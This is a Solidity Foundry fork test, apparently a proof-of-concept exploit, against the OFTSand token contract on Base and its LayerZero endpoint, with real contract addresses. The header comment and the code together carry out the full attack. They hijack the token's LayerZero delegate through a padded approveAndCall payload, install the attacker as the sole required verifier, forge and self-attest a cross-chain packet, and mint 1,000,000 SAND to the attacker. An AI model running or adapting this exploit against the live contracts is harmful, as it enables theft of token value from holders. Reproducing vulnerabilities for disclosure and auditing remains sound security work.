// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";
import {ForkPoCBase} from "../src/ForkPoCBase.sol";

// ---------------------------------------------------------------------------
// OFTSand.approveAndCall delegate-takeover -> mint SAND
//
// approveAndCall(target, amount, data) makes the OFTSand contract itself call
// target.call(data). Its only guard is that the first ABI word of `data` equals
// the caller (msg.sender) and that data.length >= 68. Neither stops an attacker
// from making OFTSand call the LayerZero endpoint's setDelegate(attacker):
// setDelegate's first (and only) param IS the attacker, so the guard passes once
// we pad the calldata to 68 bytes (the extra word is ignored by the decoder).
//
// Now attacker is OFTSand's LayerZero delegate. As delegate it reconfigures the
// receive ULN so the ONLY required DVN is the attacker, self-attests a forged
// inbound OFT packet from the (real, already-configured) ethereum peer, commits
// the verification, and calls endpoint.lzReceive -> OFTSand._credit -> _mint.
// SAND is minted straight to the attacker. No owner/role is ever pranked.
// ---------------------------------------------------------------------------

interface IOFTSand {
    function approveAndCall(address target, uint256 amount, bytes calldata data)
        external
        payable
        returns (bytes memory);
    function peers(uint32 eid) external view returns (bytes32);
}

struct Origin {
    uint32 srcEid;
    bytes32 sender;
    uint64 nonce;
}

struct SetConfigParam {
    uint32 eid;
    uint32 configType;
    bytes config;
}

struct UlnConfig {
    uint64 confirmations;
    uint8 requiredDVNCount;
    uint8 optionalDVNCount;
    uint8 optionalDVNThreshold;
    address[] requiredDVNs;
    address[] optionalDVNs;
}

interface IEndpoint {
    function delegates(address oapp) external view returns (address);
    function setConfig(address oapp, address lib, SetConfigParam[] calldata params) external;
    function inboundNonce(address receiver, uint32 srcEid, bytes32 sender) external view returns (uint64);
    function lzReceive(
        Origin calldata origin,
        address receiver,
        bytes32 guid,
        bytes calldata message,
        bytes calldata extraData
    ) external payable;
}

interface IReceiveUln {
    function verify(bytes calldata packetHeader, bytes32 payloadHash, uint64 confirmations) external;
    function commitVerification(bytes calldata packetHeader, bytes32 payloadHash) external;
}

contract ExploitTest is ForkPoCBase {
    address constant SAND = 0xac531Eb26Ca1d21b85126De8FB87E80E09002DcF; // OFTSand on base
    address constant ENDPOINT = 0x1a44076050125825900e736c501f859c50fE728c; // LZ EndpointV2
    address constant RECV_ULN = 0xc70AB6f32772f59fBfc23889Caf4Ba3376C84bAf; // ReceiveUln302 (base)

    uint32 constant ETH_EID = 30101; // source (peer already configured)
    uint32 constant BASE_EID = 30184; // local

    bytes32 peer;
    uint64 nonce;

    function setUp() public {
        forkAt("base", 50289411);
        peer = IOFTSand(SAND).peers(ETH_EID);
        require(peer != bytes32(0), "no eth peer");
        nonce = IEndpoint(ENDPOINT).inboundNonce(SAND, ETH_EID, peer) + 1;
    }

    function test_exploit() public {
        proveTokenProfit(SAND, this.attack);
    }

    function attack() external {
        vm.startPrank(attacker);

        // 1) Hijack the delegate role via approveAndCall.
        //    data = setDelegate(attacker) padded to 68 bytes so the length guard passes;
        //    the trailing zero word is ignored when the endpoint decodes one address.
        bytes memory data = abi.encodeWithSelector(
            bytes4(0xca5eb5e1), // setDelegate(address)
            attacker,
            uint256(0) // padding -> total calldata = 4 + 32 + 32 = 68 bytes
        );
        IOFTSand(SAND).approveAndCall(ENDPOINT, 0, data);
        require(IEndpoint(ENDPOINT).delegates(SAND) == attacker, "delegate not hijacked");

        // 2) As delegate, make the attacker the sole required DVN on the receive ULN.
        address[] memory req = new address[](1);
        req[0] = attacker;
        address[] memory opt = new address[](0);
        UlnConfig memory uln = UlnConfig({
            confirmations: 1,
            requiredDVNCount: 1,
            optionalDVNCount: 0,
            optionalDVNThreshold: 0,
            requiredDVNs: req,
            optionalDVNs: opt
        });
        SetConfigParam[] memory params = new SetConfigParam[](1);
        params[0] = SetConfigParam({eid: ETH_EID, configType: 2 /* CONFIG_TYPE_ULN */, config: abi.encode(uln)});
        IEndpoint(ENDPOINT).setConfig(SAND, RECV_ULN, params);

        // 3) Forge an inbound OFT packet: mint 1,000,000 SAND (amountSD * 1e12) to attacker.
        uint64 amountSD = 1_000_000_000_000; // -> 1e24 local decimals = 1,000,000 SAND
        bytes32 guid = keccak256("quorum-forged-guid");
        bytes memory message = abi.encodePacked(bytes32(uint256(uint160(attacker))), amountSD);

        bytes memory header = abi.encodePacked(
            uint8(1), // PacketV1 version
            nonce,
            ETH_EID,
            peer, // src sender = configured peer
            BASE_EID,
            bytes32(uint256(uint160(SAND))) // receiver
        );
        bytes32 payloadHash = keccak256(abi.encodePacked(guid, message));

        // 4) Attacker acts as the DVN: attest, then commit -> endpoint records the payload.
        IReceiveUln(RECV_ULN).verify(header, payloadHash, uint64(100));
        IReceiveUln(RECV_ULN).commitVerification(header, payloadHash);

        // 5) Deliver the packet: endpoint -> OFTSand._lzReceive -> _credit -> _mint(attacker).
        Origin memory origin = Origin({srcEid: ETH_EID, sender: peer, nonce: nonce});
        IEndpoint(ENDPOINT).lzReceive(origin, SAND, guid, message, "");

        vm.stopPrank();
    }
}
